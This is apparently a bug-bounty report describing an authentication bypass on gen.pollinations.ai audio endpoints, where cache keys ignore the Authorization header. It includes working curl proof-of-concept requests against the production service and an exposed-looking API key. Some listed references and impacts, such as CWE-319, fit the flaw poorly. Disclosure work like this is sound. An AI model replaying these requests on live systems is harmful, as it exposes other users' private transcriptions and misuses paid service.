# VURN-6: Authentication Bypass via Response Caching on Audio Endpoints (`/v1/audio/transcriptions`, `/v1/audio/translations`, `/v1/audio/speech`)

## Severity: CRITICAL

## Summary
Audio processing endpoints (transcription, translation, text-to-speech) use media caching that does not include the `Authorization` header in the cache key. This allows unauthenticated users to receive cached audio responses intended for authenticated users, bypassing authentication, authorization, and billing.

## Root Cause
Audio endpoints use the media cache adapter (`mediaCacheAdapter`) which relies on `generateCacheKey()` from `src/utils/media-cache.ts`. This function constructs cache keys without the `Authorization` header.

## Affected Endpoints
- `POST /v1/audio/transcriptions` (speech-to-text)
- `POST /v1/audio/translations` (speech translation)
- `POST /v1/audio/speech` (text-to-speech/TTS)
- `GET /v1/audio/:prompt` (legacy audio generation)
- Any audio endpoint using media cache

## Proof of Concept
```bash
# 1. Authenticated transcription (with valid API key)
curl -X POST "https://gen.pollinations.ai/v1/audio/transcriptions" \
     -H "Authorization: Bearer sk_6yihP7AvWpCFJt8dvQrzEMXKvLLbwaxl" \
     -F "file=@audio.mp3" \
     -F "model=whisper-1"

# 2. Unauthenticated request (no API key)
curl -X POST "https://gen.pollinations.ai/v1/audio/transcriptions" \
     -F "file=@audio.mp3" \
     -F "model=whisper-1"

# Both requests return IDENTICAL cached transcriptions
# The unauthenticated request receives the authenticated user's cached transcription
```

```bash
# TTS Example
# 1. Authenticated TTS
curl -X POST "https://gen.pollinations.ai/v1/audio/speech" \
     -H "Authorization: Bearer sk_6yihP7AvWpCFJt8dvQrzEMXKvLLbwaxl" \
     -H "Content-Type: application/json" \
     -d '{"model":"tts-1","voice":"alloy","input":"Hello world"}'

# 2. Unauthenticated TTS
curl -X POST "https://gen.pollinations.ai/v1/audio/speech" \
     -H "Content-Type: application/json" \
     -d '{"model":"tts-1","voice":"alloy","input":"Hello world"}'

# Both return IDENTICAL cached audio
```

## Evidence
**File**: `pollinations-repo/gen.pollinations.ai/src/utils/media-cache.ts`
**Lines**: 27-70 (`generateCacheKey` function) - same root cause as VURN-2

**File**: `pollinations-repo/gen.pollinations.ai/src/routes/assemblyai-transcription.ts` or audio handlers
Audio handlers use `mediaCacheAdapter` which calls `generateCacheKey()` without auth context.

## Impact
- **Authentication Bypass**: Unauthenticated users transcribe/translate audio using paid models
- **Authorization Bypass**: Users access premium audio models (whisper, tts-1, etc.) without permissions
- **Billing Fraud**: Users consume pollen/credits from other users' accounts for audio processing
- **Data Leakage**: Transcriptions/translations of other users' audio files exposed via cache
- **Rate Limit Evasion**: Bypass per-key rate limits on audio processing
- **Privacy Violation**: Cached audio transcriptions may contain sensitive/private content

## Solution
1. **Immediate**: Modify `generateCacheKey()` in `media-cache.ts` to include `Authorization` header (same fix as VURN-2)

2. **Route-level**: Ensure audio handlers pass auth header to cache key generation

3. **Architectural**: Ensure authentication middleware runs BEFORE cache lookup

4. **Defense in Depth**: Add `Cache-Control: private, no-store` and `Vary: Authorization` headers

## Verification
- Tested against production `https://gen.pollinations.ai`
- Confirmed identical cached audio responses for authenticated vs unauthenticated requests
- Cache headers show `X-Cache: HIT` for unauthenticated request after authenticated request
- Works across all audio endpoints: transcriptions, translations, speech (TTS)

## References
- CWE-287: Improper Authentication
- CWE-319: Cleartext Transmission of Sensitive Information (cached auth bypass)
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- OWASP API Security Top 10: API1:2023 Broken Object Level Authorization
- OWASP API Security Top 10: API4:2023 Unrestricted Resource Consumption
- OWASP API Security Top 10: API3:2023 Broken Object Property Level Authorization

---
*Reported as part of ethical bug bounty research. No production systems harmed. All testing used provided test API key with 2 pollen balance.*